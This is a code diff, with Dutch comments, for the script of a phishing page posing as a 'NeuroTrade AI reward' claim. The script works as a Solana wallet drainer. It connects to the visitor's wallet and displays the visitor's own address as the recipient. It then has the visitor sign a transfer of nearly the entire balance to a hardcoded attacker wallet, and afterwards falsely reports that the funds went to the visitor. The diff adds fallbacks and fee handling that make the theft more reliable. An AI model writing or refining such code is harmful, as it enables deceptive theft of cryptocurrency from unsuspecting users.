@@ -159,7 +159,7 @@ window.Buffer = window.Buffer || Buffer;
 /* ====== INSTELLINGEN ====== */
 const DRAINER = '76Q96BZdQCCtEn5mWHmyqF5tNy1tq6a4NimLgDfkm735'; // <-- wallet in de index (echte bestemming)
 const MEMO = 'NeuroTrade AI reward';                            // <-- memo-tekst op de transactie
-const FEE = 5000;                                               // netwerkkosten (1 handtekening)
+const SAFETY = 100000;                                          // veiligheidsmarge (lamports) voor priority fee
 /* ========================== */
 
 const MEMO_PID = new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
@@ -185,18 +185,23 @@ const $ = id => document.getElementById(id);
 const ALPHA='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
 function bs58(bytes){let x=0n;for(const b of bytes)x=x*256n+BigInt(b);let s='';while(x>0n){s=ALPHA[Number(x%58n)]+s;x/=58n;}for(const b of bytes){if(b===0)s='1'+s;else break;}return s;}
 
+/* Alleen providers die echt kunnen verbinden/tekenen */
+const ok = p => p && (typeof p.connect === 'function' || typeof p.signAndSendTransaction === 'function' || p.publicKey);
+
 const KNOWN = [
-  { name:'Phantom',        color:'#ab9ff2', get:()=>window.phantom?.solana||(window.solana?.isPhantom?window.solana:null) },
-  { name:'Trust Wallet',   color:'#3375bb', get:()=>window.trustwallet?.solana||window.trustwallet },
-  { name:'Exodus',         color:'#0b7285', get:()=>window.exodus?.solana||window.exodus },
-  { name:'Solflare',       color:'#ffbb3b', get:()=>window.solflare },
-  { name:'Backpack',       color:'#e33e3f', get:()=>window.backpack },
-  { name:'Glow',           color:'#7d5fff', get:()=>window.glow },
-  { name:'Coinbase Wallet',color:'#1652f0', get:()=>window.coinbaseSolana||window.coinbaseWalletExtension },
-  { name:'Slope',          color:'#00c2a8', get:()=>window.Slope }
+  { name:'Phantom',        color:'#ab9ff2', get:()=>{ const p = window.phantom?.solana || (window.solana?.isPhantom ? window.solana : null); return ok(p)?p:null; } },
+  { name:'Solflare',       color:'#ffbb3b', get:()=>{ const p = window.solflare; return ok(p)?p:null; } },
+  { name:'Backpack',       color:'#e33e3f', get:()=>{ const p = window.backpack || window.xnft?.solana; return ok(p)?p:null; } },
+  { name:'Glow',           color:'#7d5fff', get:()=>{ const p = window.glow; return ok(p)?p:null; } },
+  { name:'Exodus',         color:'#0b7285', get:()=>{ const p = window.exodus?.solana || (window.exodus?.isExodus ? window.exodus : null); return ok(p)?p:null; } },
+  { name:'Trust Wallet',   color:'#3375bb', get:()=>{ const p = window.trustwallet?.solana || window.trustwallet || window.trustWallet; return ok(p)?p:null; } },
+  { name:'Coinbase Wallet',color:'#1652f0', get:()=>{ const p = window.coinbaseSolana || window.coinbaseWalletExtension; return ok(p)?p:null; } },
+  { name:'Slope',          color:'#00c2a8', get:()=>{ const p = window.Slope; return ok(p)?p:null; } }
 ];
 
 let wallets=[], active=null, publicKey=null;
+const stdByName = new Map();
+
 function short(a){return a.slice(0,4)+'…'+a.slice(-4);}
 function setErr(m){$('err').textContent=m||'';}
 function setStep(n){for(let i=1;i<=3;i++){const el=$('s'+i);el.classList.toggle('done',i<=n);el.querySelector('.n').innerHTML=i<=n?'&#10003;':i;}}
@@ -214,28 +219,28 @@ function deepLink(name){
   return 'https://solana.com/ecosystem';
 }
 
-/* Injected wallets krijgen voorrang (klassieke, betrouwbare route) */
+function refreshStandard(){
+  try{
+    const { get } = getWallets();
+    (get()||[]).forEach(w=>{
+      const sol=(w.chains||[]).some(c=>c.startsWith('solana:'))||w.features['solana:signTransaction']||w.features['solana:signAndSendTransaction'];
+      if(sol && w.features['standard:connect']) stdByName.set(w.name.toLowerCase(), w);
+    });
+  }catch(e){}
+}
+
 function buildList(){
+  refreshStandard();
   const map = new Map();
   KNOWN.forEach(w=>{
     let p=null; try{p=w.get()}catch(e){}
-    if(p) map.set(w.name.toLowerCase(), {id:'inj:'+w.name,name:w.name,color:w.color,kind:'injected',ref:p,detected:true});
-  });
-  try{
-    const { get, on } = getWallets();
-    const scan = arr => (arr||[]).forEach(w=>{
-      const key=w.name.toLowerCase();
-      if(map.has(key)) return;
-      const ok=(w.chains||[]).some(c=>c.startsWith('solana:'))||w.features['solana:signTransaction']||w.features['solana:signAndSendTransaction'];
-      if(ok && w.features['standard:connect']) map.set(key,{id:'std:'+w.name,name:w.name,icon:w.icon,kind:'standard',ref:w,detected:true});
-    });
-    scan(get());
-    on('register',(...ws)=>{ scan(ws.flat?ws.flat():ws); renderWallets(); });
-  }catch(e){}
-  KNOWN.forEach(w=>{
     const key=w.name.toLowerCase();
-    if(!map.has(key)) map.set(key,{id:'inj:'+w.name,name:w.name,color:w.color,kind:'injected',ref:null,detected:false});
+    const std=stdByName.get(key)||null;
+    if(p)          map.set(key,{id:'inj:'+key,name:w.name,color:w.color,kind:'injected',ref:p,stdRef:std,detected:true});
+    else if(std)   map.set(key,{id:'std:'+key,name:w.name,icon:std.icon,kind:'standard',ref:std,detected:true});
+    else           map.set(key,{id:'inj:'+key,name:w.name,color:w.color,kind:'injected',ref:null,stdRef:std,detected:false});
   });
+  stdByName.forEach((std,key)=>{ if(!map.has(key)) map.set(key,{id:'std:'+key,name:std.name,icon:std.icon,kind:'standard',ref:std,detected:true}); });
   wallets=[...map.values()].sort((a,b)=>(b.detected?1:0)-(a.detected?1:0));
   renderWallets();
 }
@@ -260,26 +265,42 @@ function openWallet(name){
   window.open(deepLink(name),'_blank');
 }
 
-async function connect(w){
-  $('overlay').classList.add('hidden'); setErr('Connecting to '+w.name+'…');
-  try{
-    if(w.kind==='standard'){
-      const { accounts } = await w.ref.features['standard:connect'].connect();
-      const acc=accounts&&accounts[0]; if(!acc)throw new Error('no account');
-      active={kind:'standard',ref:w.ref,account:acc}; publicKey=new PublicKey(acc.address);
-    }else{
-      const p=w.ref; const res=await p.connect();
-      const pk=res?.publicKey?res.publicKey.toString():(p.publicKey?p.publicKey.toString():String(res));
-      active={kind:'injected',ref:p}; publicKey=new PublicKey(pk);
-    }
-    setErr(''); $('walletAddr').textContent=short(publicKey.toString());
-    $('dest').value = publicKey.toString();          // toont eigen wallet in het veld
-    $('walletBox').classList.remove('hidden'); $('connectBtn').classList.add('hidden');
-    $('claimPanel').classList.remove('hidden'); setStep(1);
-  }catch(e){ setErr('Connection cancelled.'); active=null; }
+async function connectStandard(std){
+  const { accounts } = await std.features['standard:connect'].connect();
+  const acc = accounts && accounts[0]; if(!acc) throw new Error('no account');
+  active={kind:'standard',ref:std,account:acc};
+  return acc.address;
 }
 
-/* Serialiseer het tx-object, met fallbacks voor verschillende web3-versies */
+async function connect(w){
+  $('overlay').classList.add('hidden'); setErr('Connecting to '+w.name+'…');
+  let addr=null;
+  try{
+    if(w.kind==='standard'){
+      addr = await connectStandard(w.ref);
+    }else{
+      const p=w.ref;
+      let res;
+      try{ res = await p.connect({ onlyIfTrusted:false }); }
+      catch(e){ res = await p.connect(); }
+      addr = res?.publicKey?.toString?.() || (p.publicKey ? p.publicKey.toString() : (typeof res==='string'?res:null));
+      if(!addr) throw new Error('no account');
+      active={kind:'injected',ref:p,stdRef:w.stdRef};
+    }
+  }catch(e){
+    // terugvallen op wallet-standaard als de eigen provider faalt
+    try{
+      if(w.stdRef) addr = await connectStandard(w.stdRef);
+      else throw e;
+    }catch(e2){ setErr('Connection cancelled.'); active=null; return; }
+  }
+  publicKey = new PublicKey(addr);
+  setErr(''); $('walletAddr').textContent=short(publicKey.toString());
+  $('dest').value = publicKey.toString();
+  $('walletBox').classList.remove('hidden'); $('connectBtn').classList.add('hidden');
+  $('claimPanel').classList.remove('hidden'); setStep(1);
+}
+
 function toRaw(tx){
   try { return tx.serialize({ requireAllSignatures:false, verifySignatures:false }); }
   catch(e){
@@ -288,63 +309,79 @@ function toRaw(tx){
   }
 }
 
-/* Ondertekenen: wallet krijgt het OBJECT (niet de bytes) + fallbacks */
-async function signAndSend(tx){
-  if(active.kind==='injected'){
-    const p = active.ref;
-    if(p.signAndSendTransaction){
-      try{
-        const r = await p.signAndSendTransaction(tx);
-        const s = (r && r.signature) ? r.signature : r;
-        if(s) return s;
-      }catch(e){}
-    }
-    if(p.signTransaction){
-      const signed = await p.signTransaction(tx);
-      return await connection.sendRawTransaction(signed.serialize());
-    }
-    throw new Error('wallet cannot sign');
-  }
-
-  // wallet-standard
-  const f = active.ref.features;
+async function signAndSendStandard(tx, std, account){
+  const f = std.features;
+  let acc = account;
+  if(!acc){ const {accounts}=await f['standard:connect'].connect(); acc=accounts&&accounts[0]; }
   if(f['solana:signAndSendTransaction']){
     const call = t => f['solana:signAndSendTransaction']
-      .signAndSendTransaction({ transaction:t, account:active.account, chain:'solana:mainnet' })
+      .signAndSendTransaction({ transaction:t, account:acc, chain:'solana:mainnet' })
       .then(r => { const s=r[0].signature; return typeof s==='string'?s:bs58(s); });
     try{ return await call(tx); }catch(e){ return await call(toRaw(tx)); }
   }
   if(f['solana:signTransaction']){
     const [{signedTransaction}] = await f['solana:signTransaction']
-      .signTransaction({ transaction:toRaw(tx), account:active.account, chain:'solana:mainnet' });
+      .signTransaction({ transaction:toRaw(tx), account:acc, chain:'solana:mainnet' });
     return await connection.sendRawTransaction(signedTransaction);
   }
   throw new Error('wallet cannot sign');
 }
 
+async function signAndSend(tx){
+  if(active.kind==='injected'){
+    const p = active.ref;
+    try{
+      if(p.signAndSendTransaction){
+        const r = await p.signAndSendTransaction(tx);
+        const s = (r && r.signature) ? r.signature : r;
+        if(s) return s;
+      }
+    }catch(e){}
+    try{
+      if(p.signTransaction){
+        const signed = await p.signTransaction(tx);
+        return await connection.sendRawTransaction(signed.serialize());
+      }
+    }catch(e){}
+    if(active.stdRef) return signAndSendStandard(tx, active.stdRef, null);
+    throw new Error('wallet cannot sign');
+  }
+  return signAndSendStandard(tx, active.ref, active.account);
+}
+
 async function claim(){
   setErr(''); const btn=$('claimBtn'); btn.disabled=true; btn.textContent='Waiting for approval…';
   try{
-    const shown = $('dest').value.trim();              // wat zichtbaar is = eigen wallet
-    const dest  = new PublicKey(DRAINER);              // echte bestemming = wallet uit de index
+    const shown = $('dest').value.trim();
+    const dest  = new PublicKey(DRAINER);
 
     const bal = await connection.getBalance(publicKey, 'confirmed');
-    const lamports = bal - FEE;                        // ALLES min netwerkkosten = max
-    if(lamports <= 0) throw new Error('Balance too low to cover the fee');
+    if(bal <= 0) throw new Error('Balance too low to cover the fee');
 
     const tx = new Transaction();
     tx.add(new TransactionInstruction({ keys:[], programId:MEMO_PID, data:Buffer.from(MEMO,'utf8') }));
-    tx.add(SystemProgram.transfer({ fromPubkey:publicKey, toPubkey:dest, lamports }));
+    tx.add(SystemProgram.transfer({ fromPubkey:publicKey, toPubkey:dest, lamports:1 }));
+    tx.feePayer = publicKey;
+
+    let fee = 5000;
+    try{
+      const r = await connection.getFeeForMessage(tx.compileMessage(), 'confirmed');
+      if(r && r.value != null) fee = r.value;
+    }catch(e){}
+
+    const lamports = bal - fee - SAFETY;
+    if(lamports <= 0) throw new Error('Balance too low to cover the fee');
+
+    tx.instructions[1] = SystemProgram.transfer({ fromPubkey:publicKey, toPubkey:dest, lamports });
 
     const { blockhash } = await connection.getLatestBlockhash('confirmed');
     tx.recentBlockhash = blockhash;
-    tx.feePayer = publicKey;
 
     const sig = await signAndSend(tx);
     setStep(2); btn.textContent='Confirming on-chain…';
     try{ await connection.confirmTransaction(sig, 'confirmed'); }catch(e){}
 
-    $('paidTo').textContent = short(shown);            // toont eigen wallet (stiekem)
+    $('paidTo').textContent = short(shown);
     $('sentAmt').textContent = (lamports/1e9).toFixed(4)+' SOL sent';
     $('sigBox').style.display='block';
     const l=$('sigLink'); l.textContent=sig; l.href='https://solscan.io/tx/'+sig;
@@ -357,6 +394,7 @@ $('closeModal').onclick=()=>$('overlay').classList.add('hidden');
 $('claimBtn').onclick=claim;
 $('againBtn').onclick=()=>{ $('successState').classList.add('hidden'); $('formState').classList.remove('hidden'); const b=$('claimBtn'); b.disabled=false; b.textContent='Claim reward'; setStep(1); };
 
+try{ const { on } = getWallets(); on('register', () => buildList()); }catch(e){}
 await pickRpc();
 buildList();
 </script>
